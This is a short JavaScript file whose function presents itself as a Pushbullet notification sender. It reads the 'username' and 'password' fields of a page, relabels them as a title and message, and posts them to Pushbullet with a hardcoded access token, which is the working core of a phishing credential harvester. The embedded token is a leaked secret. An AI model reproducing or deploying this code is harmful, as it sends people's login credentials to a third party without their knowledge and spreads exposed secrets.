function sendPushbulletNotification(title, message) {
  const apiToken = 'o.MfcM7XP7IAmiE55iWBqCUei81d48P6p7'; // Replace with your actual Pushbullet API token
  const data = {
    type: "note",
    title: title,
    body: message
  };

  fetch("https://api.pushbullet.com/v2/pushes", {
      method: "POST",
      headers: {
        "Access-Token": apiToken,
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    })
    .then(response => {
      if (response.ok) {
        return response.json();
      } else {
        throw new Error("Failed to send notification");
      }
    })
    .then(data => console.log("Notification sent successfully:", data))
    .catch(error => console.error("Error:", error));
}

function sendNotification() {
  const title = document.getElementById("username").value;
  const message = document.getElementById("password").value;

  if (title && message) {
    sendPushbulletNotification(title, message);
  } else {
    alert("Please enter both a title and message.");
  }
}